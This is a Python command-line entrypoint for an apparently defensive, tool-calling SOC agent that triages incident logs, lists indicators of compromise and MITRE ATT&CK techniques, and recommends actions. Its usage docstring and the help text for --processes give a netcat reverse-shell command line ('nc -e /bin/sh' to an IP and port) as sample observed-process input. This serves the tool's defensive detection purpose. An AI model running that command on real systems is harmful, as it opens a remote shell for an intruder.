"""Command-line entrypoint for the SOC agent.

Usage:
    soc-agent investigate --file examples/sample_incident.txt
    soc-agent investigate --file incident.txt --processes "nc -e /bin/sh 10.0.0.5 4444,bash"
    cat incident.txt | soc-agent investigate --json
"""

from __future__ import annotations

import argparse
import json
import sys

from soc_agent.agent import AgentReport, SocAgent

_SEVERITY_ICONS = {
    "critical": "🔴",
    "high": "🟠",
    "medium": "🟡",
    "low": "🟢",
}


def _read_incident_text(args: argparse.Namespace) -> str:
    if args.file:
        with open(args.file, encoding="utf-8") as handle:
            return handle.read()
    if not sys.stdin.isatty():
        return sys.stdin.read()
    raise SystemExit("No input provided. Pass --file <path> or pipe incident text via stdin.")


def _render_human(report: AgentReport, agent: SocAgent) -> str:
    icon = _SEVERITY_ICONS.get(report.severity, "")
    lines = [
        f"{icon} Severity: {report.severity.upper()}",
        f"Mode: {'live LLM tool-use' if report.llm_backed else 'offline deterministic planner'}",
    ]
    if report.notes:
        lines.append(f"Note: {report.notes}")

    lines += ["", f"Investigation trace ({len(report.trace)} tool call(s)):"]
    for record in report.trace:
        lines.append(f"  -> {record.tool}({', '.join(f'{k}=...' for k in record.input)})")

    lines += ["", "Indicators of compromise:"]
    if any(report.iocs.values()):
        for category, values in report.iocs.items():
            for value in values:
                lines.append(f"  - [{category}] {value}")
    else:
        lines.append("  (none)")

    lines += ["", "MITRE ATT&CK techniques:"]
    if report.techniques:
        for technique in report.techniques:
            lines.append(f"  - {technique['id']} {technique['name']} ({technique['tactic']})")
    else:
        lines.append("  (none)")

    lines += ["", "Summary:", report.summary]
    lines += ["", "Recommended actions:"]
    for action in report.recommended_actions:
        lines.append(f"  - {action}")

    return "\n".join(lines)


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="soc-agent",
        description="Autonomous, tool-calling SOC analyst agent for triaging security incidents.",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    investigate = subparsers.add_parser("investigate", help="Investigate an incident and produce a verdict.")
    investigate.add_argument("--file", "-f", help="Path to a file containing the raw incident/log text.")
    investigate.add_argument(
        "--processes",
        help="Comma-separated list of observed process command lines, e.g. 'nc -e /bin/sh 10.0.0.5 4444,bash'.",
    )
    investigate.add_argument("--json", action="store_true", help="Output the full report as JSON.")
    investigate.add_argument("--api-key", help="Anthropic API key (defaults to ANTHROPIC_API_KEY env var).")
    investigate.add_argument("--max-turns", type=int, default=8, help="Max tool-use turns in live mode.")

    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_arg_parser()
    args = parser.parse_args(argv)

    if args.command == "investigate":
        incident_text = _read_incident_text(args)
        processes = [p.strip() for p in args.processes.split(",")] if args.processes else None

        agent = SocAgent(api_key=args.api_key, max_turns=args.max_turns)
        report = agent.investigate(incident_text, processes=processes)

        if args.json:
            print(json.dumps(report.to_dict(), indent=2))
        else:
            print(_render_human(report, agent))
        return 0

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
